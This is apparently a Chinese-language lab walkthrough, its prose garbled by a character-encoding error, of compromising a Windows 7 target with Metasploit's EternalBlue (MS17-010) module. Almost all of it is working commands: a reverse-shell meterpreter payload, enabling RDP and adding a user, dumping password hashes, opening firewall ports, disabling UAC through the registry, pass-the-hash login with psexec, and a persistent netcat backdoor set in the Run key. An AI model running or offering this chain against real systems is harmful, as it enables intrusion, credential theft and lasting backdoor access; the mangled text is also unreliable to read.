é¶æœºï¼š
ä½¿ç”¨Win7æ——èˆ°ç‰ˆSP1-64ä½ç³»ç»Ÿé•œåƒ
å®¶åº­ã€å·¥ä½œç½‘ç»œâ€”â€”ã€‹å¼€å¯é˜²ç«å¢™
å…¬å…±ç½‘ç»œâ€”â€”ã€‹å…³é—­ç½‘ç»œ

æ°¸æ’ä¹‹è“ï¼Œåˆ©ç”¨çš„æ˜¯Windowsçš„SMBæ¼æ´žï¼Œåˆ©ç”¨æ­¤ç—…æ¯’åˆ¶é€ äº†wannacryå‹’ç´¢ç—…æ¯’
PSï¼šwin7æ˜¯2009å¹´å‘å¸ƒ
å¾®è½¯å®˜æ–¹æ–‡æ¡£ï¼š
https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010

ä¸»æœºæ‰«æï¼Œæ˜¯å¦æœ‰æ¼æ´žï¼›

æ”»å‡»æœºï¼š
â”Œâ”€â”€(rootðŸ’€kali-linux-2021-3)-[~/Evil-Droid-master/evilapk]
â””â”€# systemctl start postgresql
#msfdb run
#å¯ä»¥å¯åŠ¨æ•°æ®åº“ï¼Œå¹¶è¿›å…¥æ¡†æž¶
                                                                                                                                                                               
â”Œâ”€â”€(rootðŸ’€kali-linux-2021-3)-[~/Evil-Droid-master/evilapk]
â””â”€# systemctl enable postgresql
                                                                                                                                                                               
â”Œâ”€â”€(rootðŸ’€kali-linux-2021-3)-[~/Evil-Droid-master/evilapk]
â””â”€# systemctl status postgresql

â”Œâ”€â”€(rootðŸ’€kali-linux-2021-3)-[~/Evil-Droid-master/evilapk]
â””â”€# msfdb run 
å¯åŠ¨æ•°æ®åº“ï¼Œå¹¶å¯åŠ¨æ¡†æž¶

æœç´¢æ°¸æ’ä¹‹è“ ms17-010
msf6 > search ms17-010
msf6 > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.211.55.4
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
æ£€æµ‹ç›®æ ‡ä¸»æœºæ˜¯å¦æ˜¯è„†å¼±çš„ï¼›æ˜¯å¦å­˜åœ¨æ¼æ´ž

###è¿›è¡Œæ”»å‡»
msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue 
å¯ä»¥ä¸é€€å‡ºï¼Œç›´æŽ¥è½½å…¥

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.211.55.4
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.211.55.6

msf6 exploit(windows/smb/ms17_010_eternalblue) > run


åˆ›å»ºè¿œç¨‹æ¡Œé¢è¿žæŽ¥
meterpreter > 

é¶æœºä¸Šéœ€è¦å¼€å¯è¿œç¨‹æ¡Œé¢è¿žæŽ¥
å³é”®è®¡ç®—æœº-å±žæ€§-é«˜çº§ç³»ç»Ÿè®¾ç½®â€”â€”â€”â€”è¿œç¨‹-å…è®¸è¿œç¨‹è¿žæŽ¥

æ”»å‡»æœºå› ä¸ºæœ‰æœ€é«˜æƒé™ï¼Œä¹Ÿå¯ä»¥è¿œç¨‹å¼€å¯
RDPè¿œç¨‹æ¡Œé¢åè®®ï¼›enable_rdp
meterpreter > run post/windows/manage/enable_rdp
å¼€å¯è¿œç¨‹ç™»å½•æƒé™

åœ¨é¶æœºä¸Šåˆ›å»ºç”¨æˆ·
meterpreter > run post/windows/manage/enable_rdp USERNAME=laohe PASSWORD=123456

é‡æ–°æ‰¾ä¸€å°windowsï¼Œè¿œç¨‹ç™»å½•
æˆ–è€…kaliè¾“å…¥
â”Œâ”€â”€(rootðŸ’€kali-linux-2021-3)-[~]
â””â”€# rdesktop 10.211.55.4
#ä¸è¦è¿™ä¹ˆæžï¼Œä¼šè¢«é¶æœºç”¨æˆ·å‘çŽ°

å…³é—­ä¸»æœºçš„é˜²æŠ¤ç­–ç•¥å¹¶å¼€å¯åŽé—¨

è¿™æ˜¯Windowså­˜å¯†ç çš„åœ°æ–¹
C:\Windows\System32\config

meterpreter > hashdump
å¯¼å‡ºå¯†ç å“ˆå¸Œå€¼
laohe:1001:XXXXXX


ç»™é¶æœºé˜²ç«å¢™å¼€å¯4444ç«¯å£è®¿é—®æƒé™
meterpreter > shell
è¿›å…¥é¶æœºCMDå‘½ä»¤è¡Œ
C:\Windows\system32>netsh firewall add portopening TCP 444 "laohe" ENABLE ALL
C:\Windows\system32>chcp 65001
è§£å†³ä¸­æ–‡ä¹±ç é—®é¢˜

å…³é—­UACï¼ˆç”¨æˆ·è´¦å·æŽ§åˆ¶ï¼‰ï¼›UACåŠŸèƒ½é˜»æ­¢æ¶æ„ç¨‹åºæŸåç³»ç»Ÿ
C:\Windows\system32>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
ADD æ·»åŠ ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹
-v åˆ›å»ºé”®å€¼
-t é”®å€¼ç±»åž‹
-d é”®å€¼
-f å¼ºåˆ¶ä¿®æ”¹æ³¨å†Œè¡¨

å¼€å¯é»˜è®¤å…±äº«åŠŸèƒ½
C:\Windows\system32>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

C:\Windows\system32>exit
C:\Windows\system32>exit
C:\Windows\system32>exit

meterpreter > background
æŠŠseesionä¿å­˜åˆ°åŽå°

æŸ¥çœ‹ä¼šè¯
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions


psexecæ¨¡å—ï¼Œä½¿ç”¨æ­¤æ‰©å¤§æˆ˜æžœï¼›ç”¨ç”¨æˆ·åå’Œå¯†ç å“ˆå¸Œå€¼ç™»å½•é¶æœºï¼›
msf6 exploit(windows/smb/ms17_010_eternalblue) > 

msf6 exploit(windows/smb/ms17_010_eternalblue) > use exploit/windows/smb/psexec 
msf6 exploit(windows/smb/psexec) > show options
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.211.55.4
msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set SMBUser laohe
msf6 exploit(windows/smb/psexec) > set SMBPass XXX
msf6 exploit(windows/smb/psexec) > set LHOST 10.211.55.6
msf6 exploit(windows/smb/psexec) > set SMBDomain WORKGROUP
msf6 exploit(windows/smb/psexec) > set SMBUser laohe
msf6 exploit(windows/smb/psexec) > run
æœ‰æ—¶ä¸€æ¬¡ä¸æˆåŠŸ

æŒä¹…ç”Ÿæ•ˆï¼Œä½¿ç”¨Linuxè‡ªå¸¦çš„ncå·¥å…·ï¼Œä¸Šä¼ åˆ°é¶æœº
æŠŠnc.exeä¸Šä¼ é¶æœºï¼Œå¹¶å¼€æœºå¯åŠ¨
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows
meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\nc.exe -Ldp 443 -e cmd.exe'

































